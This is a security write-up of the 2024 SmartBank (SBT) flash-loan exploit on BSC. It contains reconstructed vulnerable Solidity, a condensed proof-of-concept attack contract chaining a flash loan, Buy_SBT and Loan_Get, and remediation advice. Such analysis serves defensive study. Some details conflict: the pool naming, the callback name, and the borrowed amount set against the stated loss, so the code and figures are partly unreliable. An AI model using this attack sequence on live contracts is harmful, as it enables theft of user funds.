# SBT (SmartBank) — Flash Loan and Buy/Loan Mechanism Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-25 |
| **Protocol** | SBT / SmartBank |
| **Chain** | BSC |
| **Loss** | ~56,000 BUSD |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | SmartBank (Bank contract) |
| **Root Cause** | `Loan_Get()` references a spot price manipulable via `Buy_SBT()` when calculating collateral value — allows excessive USDT borrowing after SBT price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/SBT_exp.sol) |

---

## 1. Vulnerability Overview

The SmartBank protocol accepted BUSD deposits to mint SBT tokens, which could then be used as collateral to borrow USDT. The attacker borrowed 1,950,000 BUSD via a Uniswap V3 flash loan, initialized the Bank contract via `_Start()`, then purchased 20,000,000 SBT through `Buy_SBT()`. They subsequently called `Loan_Get()` to borrow USDT, repaid the flash loan, and pocketed the profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: Buy_SBT mints SBT at the current pool price
function Buy_SBT(uint256 busdAmount) external {
    IERC20(BUSD).transferFrom(msg.sender, address(this), busdAmount);
    // ❌ SBT minted immediately based on current BUSD deposit amount (price manipulable)
    uint256 sbtAmount = busdAmount * SBT_PER_BUSD;
    IERC20(SBT).mint(msg.sender, sbtAmount);
}

function Loan_Get(uint256 usdtAmount) external {
    uint256 sbtBalance = IERC20(SBT).balanceOf(msg.sender);
    // ❌ Borrow limit determined solely by SBT balance — balance manipulated via flash loan
    require(sbtBalance * USDT_PER_SBT >= usdtAmount, "Insufficient collateral");
    IERC20(USDT).transfer(msg.sender, usdtAmount);
}

// ✅ Correct code: Apply TWAP-based SBT valuation to borrow limit
function Loan_Get(uint256 usdtAmount) external {
    uint256 sbtBalance = IERC20(SBT).balanceOf(msg.sender);
    uint256 sbtPrice = ITwapOracle(ORACLE).getPrice(SBT);  // ✅ TWAP price
    require(sbtBalance * sbtPrice >= usdtAmount * 1e18, "Insufficient collateral");
    IERC20(USDT).transfer(msg.sender, usdtAmount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Uniswap V3 Flash Loan: borrow 1,950,000 BUSD
  │
  ├─[2]─► Transfer 950,000 BUSD → Bank contract
  │
  ├─[3]─► Call Bank._Start() (initialization)
  │
  ├─[4]─► Bank.Buy_SBT() → acquire 20,000,000 SBT
  │
  ├─[5]─► Call Bank.Loan_Get(1,966,930 USDT)
  │         └─► Borrow USDT using SBT as collateral
  │
  ├─[6]─► Repay flash loan (BUSD + fee)
  │
  └─[7]─► Total loss: ~56,000 BUSD (USDT proceeds minus flash loan cost)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    address constant POOL = /* Uniswap V3 BUSD/USDC Pool */;

    function testExploit() external {
        // [1] Uniswap V3 flash loan for 1.95M BUSD
        IUniswapV3Pool(POOL).flash(address(this), 1_950_000e18, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) external {
        // [2] Transfer 950K BUSD to Bank
        IERC20(BUSD).transfer(BANK, 950_000e18);

        // [3] Initialize Bank
        IBank(BANK)._Start();

        // [4] Buy SBT with remaining BUSD
        IERC20(BUSD).approve(BANK, type(uint256).max);
        IBank(BANK).Buy_SBT(IERC20(BUSD).balanceOf(address(this)));

        // [5] Borrow USDT using SBT as collateral
        IBank(BANK).Loan_Get(1_966_930e18);

        // [6] Repay flash loan
        IERC20(BUSD).transfer(POOL, 1_950_000e18 + fee0);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation — `Loan_Get()` collateral valuation relies on a spot-price-based SBT price manipulable via `Buy_SBT()` |
| **Attack Technique** | Spot Price Collateral Inflation Borrow (flash loan used as auxiliary funding mechanism) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Adopt a TWAP Oracle**: Calculate SBT collateral value using a time-weighted average price rather than the spot price.
2. **Flash Loan Defense**: Add same-block restrictions to `_Start()` and `Buy_SBT()`.
3. **Collateral Lock Period**: Require SBT used as collateral to be locked for at least 1 block before borrowing is permitted.
4. **Borrow Limit Cap**: Restrict the maximum borrow amount achievable within a single transaction.

## 7. Lessons Learned

- **Buy+Loan in the Same Transaction**: Allowing purchase and collateral-backed borrowing within the same transaction creates flash loan attack exposure.
- **Spot Price-Based Collateral Valuation**: Determining collateral value from the current deposit amount or spot price enables manipulation.
- **Access Control on `_Start()` Initialization**: Initialization functions require explicit access controls.